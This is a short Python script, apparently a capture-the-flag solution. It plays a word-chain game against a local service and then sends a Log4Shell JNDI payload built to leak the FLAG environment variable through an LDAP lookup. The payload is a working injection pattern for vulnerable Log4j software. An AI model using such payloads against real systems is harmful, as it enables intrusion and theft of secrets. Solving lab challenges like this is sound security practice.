#!/usr/bin/env python3

import socket
import time

EXPLOIT = "${jndi:ldap://localhost:1389/${env:FLAG}}"


def main():
    bar = {}

    with open('fish.txt', 'r') as f:
        while True:
            line = f.readline().strip()
            if not line:
                break

            if line[0] in bar:
                bar[line[0]].append(line)
            else:
                bar[line[0]] = [line]

    try:
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientsocket.connect(('localhost', 8888))  # Connect to ip address and port

        time.sleep(1)
        for _ in range(20):
            foo = clientsocket.recv(4096).decode()  # Read string
            foo = foo.strip().split('\n')[-1].split(' ')[1:]
            letter = foo[-1][-1]
            print(foo)
            print('Letter to use', letter)
            word = bar[letter][0] + '\n'
            bar[letter] = bar[letter][1:]
            print('Word to send', word)
            clientsocket.sendall(word.encode())  # Write string
            time.sleep(0.1)

        print(clientsocket.recv(4096).decode())  # Read string

        clientsocket.sendall(EXPLOIT.encode())
        clientsocket.close()
    except socket.error as e:
        print(str(e))


if __name__ == '__main__':
    main()
